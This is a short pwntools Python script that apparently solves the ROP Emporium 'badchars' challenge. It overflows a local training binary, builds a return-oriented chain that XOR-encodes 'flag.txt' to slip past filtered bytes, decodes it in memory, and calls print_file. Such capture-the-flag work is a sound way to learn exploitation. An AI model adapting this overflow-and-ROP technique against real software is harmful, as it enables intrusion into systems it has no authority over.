from pwn import *

elf = context.binary = ELF('./badchars')
p = process()

pop_r12_r13_r14_r15 = 0x000000000040069c
mov_r13_r12 = 0x0000000000400634
xor_r15_r14 = 0x0000000000400628
pop_r14_r15 = 0x00000000004006a0
pop_rdi = 0x00000000004006a3
print_file = 0x00400510
bss = 0x601038

raw = b"flag.txt"
xor_key = 0x02
enc = bytes([b ^ xor_key for b in raw])

payload = flat(
    "A"*40,
    pop_r12_r13_r14_r15,
    enc,
    bss,
    0x0,
    0x0,
    mov_r13_r12,
    
)

for i in range(len(enc)):
    payload += p64(pop_r14_r15) + p64(xor_key) + p64(bss+i) + p64(xor_r15_r14)

payload += p64(pop_rdi) + p64(bss) + p64(print_file)

p.sendline(payload)
p.interactive()